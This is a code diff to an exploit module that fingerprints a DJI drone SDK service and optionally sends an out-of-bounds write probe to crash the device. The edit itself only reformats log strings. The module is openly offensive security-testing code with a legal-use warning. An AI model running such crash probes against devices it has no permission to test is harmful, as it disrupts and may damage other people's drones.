@@ -153,8 +153,7 @@ class Exploit(HTTPClient):
         print_warning("[LEGAL] Authorized use only. Only test against devices you own or have permission to test.")
 
         # Stage 1: fingerprint
-        print_status("[Stage 1] Probing DJI v2 SDK service on {}:{}".format(
-            self.target, self.port))
+        print_status(f"[Stage 1] Probing DJI v2 SDK service on {self.target}:{self.port}")
         try:
             sock = socket.create_connection((self.target, int(self.port)), timeout=_SDK_TIMEOUT)
             sock.settimeout(3)
@@ -166,16 +165,16 @@ class Exploit(HTTPClient):
             sock.close()
             if banner:
                 print_success("[Stage 1] DJI SDK TCP service is open and responsive")
-                print_info("[Stage 1] Banner bytes: {}".format(banner.hex()[:64]))
+                print_info(f"[Stage 1] Banner bytes: {banner.hex()[:64]}")
                 if _DJI_SDK_MAGIC in banner:
                     print_success("[Stage 1] DJI SDK magic confirmed (0x55AA)")
             else:
                 print_warning("[Stage 1] Port open but no banner received")
         except ConnectionRefusedError:
-            print_warning("[Stage 1] Connection refused — port {} not open".format(self.port))
+            print_warning(f"[Stage 1] Connection refused — port {self.port} not open")
             return
         except Exception as e:
-            print_error("[Stage 1] Connection error: {}".format(e))
+            print_error(f"[Stage 1] Connection error: {e}")
             return
 
         # Stage 2: vulnerability assessment
@@ -196,15 +195,14 @@ class Exploit(HTTPClient):
                 sock.settimeout(3)
                 try:
                     resp = sock.recv(64)
-                    print_info("[Stage 3] Response after overflow probe: {}".format(resp.hex()[:32]))
+                    print_info(f"[Stage 3] Response after overflow probe: {resp.hex()[:32]}")
                 except socket.timeout:
                     print_success("[Stage 3] Timeout after overflow probe — crash/reset likely")
                 sock.close()
             except ConnectionResetError:
                 print_success("[Stage 3] Connection reset — OOB write confirmed (crash)")
             except Exception as e:
-                print_success("[Stage 3] Exception: {} — likely crash indicator".format(
-                    type(e).__name__))
+                print_success(f"[Stage 3] Exception: {type(e).__name__} — likely crash indicator")
         else:
             print_info("[Stage 3] Set do_crash=True to send OOB crash probe (may reboot device)")
 
